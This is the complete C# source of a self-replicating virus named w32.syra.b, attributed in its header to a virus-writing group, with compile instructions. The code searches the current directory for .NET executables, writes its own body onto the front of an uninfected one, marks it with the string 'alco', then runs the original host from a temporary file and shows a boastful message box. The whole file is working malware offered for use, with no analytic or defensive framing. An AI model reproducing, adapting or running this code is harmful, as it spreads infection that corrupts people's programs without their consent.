   //////////////////////////////////////////////////////////////////////////////////////////////[syra.b.cs]///////////////////
   //////////////////////
   // w32.syra.b ///////
   ////////////////////

   // sept. 22, 2002 - now syra only infects dotnet exe files, in current directory and in (1 second / 1 Hertz) fashion...
   //
   // csc /target:winexe syra.b.cs (no more copy con shitz unlike in the first version..)
   //
   // alcopaul
   // brigada ocho & rrlf
   //
   //

   using System;
   using System.IO;
   using System.Reflection;
   using System.Runtime.InteropServices;

   class msil_syra_by_alcopaul
   {
      public class Win32 {
      [DllImport("shell32.dll", CharSet=CharSet.Auto)]
      public static extern int ShellExecute(int hWnd, String oper, String file, String param,
                        String dir, int type);
      [DllImport("user32.dll", CharSet=CharSet.Auto)]
      public static extern int MessageBox(int hWnd, String text,
                        String caption, uint type);
      }
     public static void Main(String[] args)
      {
      Module exename = Assembly.GetExecutingAssembly().GetModules()[0];
      string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
      foreach (string file in files){
      try
      {
      AssemblyName.GetAssemblyName(file); // !!!! check if msil :: on error goto next file
      FileStream fs = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Read);
      StreamReader r = new StreamReader(fs);
      int fff = (int) fs.Length;
      int rrr = fff - 4;
      r.BaseStream.Seek(rrr, SeekOrigin.Begin);
      string g = r.ReadLine();
      r.Close();
      string hhh = "alco";
      if (g==hhh)
      continue;
      else
      if (file==exename.FullyQualifiedName)
      continue;
      else
      try
         {
         Infect(file);
         }
      catch
         {
         continue;
         }
      break;
      }
      catch
      {
      continue;
      }
      }
      FileStream fs1 = new FileStream(exename.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
      BinaryReader r1 = new BinaryReader(fs1);
      int host = (int) fs1.Length;
      int vir = host - 5120;
      r1.BaseStream.Seek(5120, SeekOrigin.Begin);
      byte[] bytes = new byte[vir];
      int numBytesToRead = vir;
      int numBytesRead = 0;
      while (numBytesToRead > 0)
      {
      int n = r1.Read(bytes, numBytesRead, numBytesToRead);
      if (n==0)
      break;
      numBytesRead += n;
      numBytesToRead -= n;
      }
      r1.Close();
      FileStream fs11 = new FileStream("_U-.exe", FileMode.OpenOrCreate, FileAccess.Write);
      BinaryWriter w1 = new BinaryWriter(fs11);
      w1.BaseStream.Seek(0, SeekOrigin.Begin);
      w1.Write(bytes);
      w1.Close();
      string rect = Directory.GetCurrentDirectory();
      Win32.ShellExecute(0, null, "_U-.exe", null, rect, 1);
      wet:
         try
         {
         File.Delete("_U-.exe");
         }
         catch
         {
         goto wet;
         }
         if (File.Exists("_U-.exe")==true)
         goto wet;
      Win32.MessageBox(0, "::: now infecting dotnet files only :P :::", "msil.syra.b by alcopaul",
                      0);
   }
      public static void Infect(string host)
      {
        Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
        FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
        BinaryReader r = new BinaryReader(fs);
        r.BaseStream.Seek(0, SeekOrigin.Begin);
        byte[] bytes = new byte[5120];
        int numBytesToRead = (int) 5120;
        int numBytesRead = 0;
        while (numBytesToRead > 0)
        {
        int n = r.Read(bytes, numBytesRead, numBytesToRead);
        if (n==0)
        break;
        numBytesRead += n;
        numBytesToRead -= n;
       }
        r.Close();
        FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
        BinaryReader w33 = new BinaryReader(fs133);
        w33.BaseStream.Seek(0, SeekOrigin.Begin);
        byte[] bytes2 = new byte[fs133.Length];
        int numBytesToRead2 = (int) fs133.Length;
        int numBytesRead2 = 0;
        while (numBytesToRead2 > 0)
        {
        int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
        if (n==0)
        break;
        numBytesRead2 += n;
        numBytesToRead2 -= n;
        }
        w33.Close();
        FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
        BinaryWriter w = new BinaryWriter(fs1);
        w.BaseStream.Seek(0, SeekOrigin.Begin);
        w.Write(bytes);
        w.Write(bytes2);
        w.Write("alco");
        w.Close();
     }
   }
